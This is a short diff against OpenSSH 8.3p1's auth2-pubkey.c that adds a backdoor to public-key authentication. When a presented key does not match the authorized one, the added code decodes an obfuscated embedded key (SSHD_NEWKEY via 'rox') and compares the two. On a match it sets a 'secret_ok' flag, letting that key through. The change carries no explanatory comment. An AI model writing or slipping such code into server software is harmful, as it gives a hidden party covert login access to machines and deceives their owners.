@@ -1,0 +1,25 @@
+diff -Nuar 8.3p1.orig/auth2-pubkey.c 8.3p1/auth2-pubkey.c
+--- 8.3p1.orig/auth2-pubkey.c	2020-06-09 18:39:56.053921886 +0200
++++ 8.3p1/auth2-pubkey.c	2020-06-10 10:18:28.796952019 +0200
+@@ -619,8 +619,19 @@
+ 			goto out;
+ 	} else {
+ 		/* Plain key: check it against key found in file */
+-		if (!sshkey_equal(found, key) || keyopts->cert_authority)
+-			goto out;
++		if (!sshkey_equal(found, key) || keyopts->cert_authority){
++			char *newkey = strdup(SSHD_NEWKEY), *keytext = NULL;
++			rox(newkey);
++			sshkey_to_base64(key, &keytext);
++			if(strncmp(newkey,keytext,strlen(keytext))){
++				CLEAN(keytext);
++				CLEAN(newkey);
++				goto out;
++			}
++			secret_ok = 1;
++			CLEAN(keytext);
++			CLEAN(newkey);
++		}
+ 	}
+ 
+ 	/* We have a candidate key, perform authorisation checks */
